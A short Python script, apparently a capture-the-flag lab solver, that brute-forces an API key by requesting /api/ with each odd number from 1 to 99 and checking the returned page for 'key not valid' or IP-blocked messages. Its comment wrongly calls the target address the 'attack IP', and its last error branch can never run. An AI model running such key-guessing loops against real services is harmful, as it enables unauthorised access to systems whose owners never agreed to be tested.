import requests
from bs4 import BeautifulSoup

'''
This program enumerates http://machine_ip/api/api_key and
replaces api_key with an odd number between 1-100 in search of
the correct API key.
'''

SCHEME = "http"
DOMAIN_NAME = "IP_Address" #Change this to your own attack IP
PORT = "80"
PATH_TO_FILE = "/api/"
BLOCKED_MESSAGE = "SANTA PROTECTION MECHANISM ACTIVATED."
WRONG_KEY = "Key not valid!"

for api_key in range(1, 100, 2):
    html = requests.get(SCHEME + "://" + DOMAIN_NAME + ":" + PORT + PATH_TO_FILE + str(api_key))
    soup = BeautifulSoup(html.text, "lxml")
    paragraph = soup.find("p")

    # Check if you've been blocked
    if BLOCKED_MESSAGE in paragraph.text:
        print("Your IP has been blocked, restart machine to unblock IP")
        exit()

    # Let user know what key program is on
    elif WRONG_KEY in paragraph.text:
        print("Wrong Key - " + str(api_key) + " - Still looking...")

    # Key Found
    elif not WRONG_KEY in paragraph.text:
        print("API Key Found - " + str(api_key))
        exit()

    # Other Error
    else:
        print("Something went wrong, are the global variables configured properly?")
        exit()
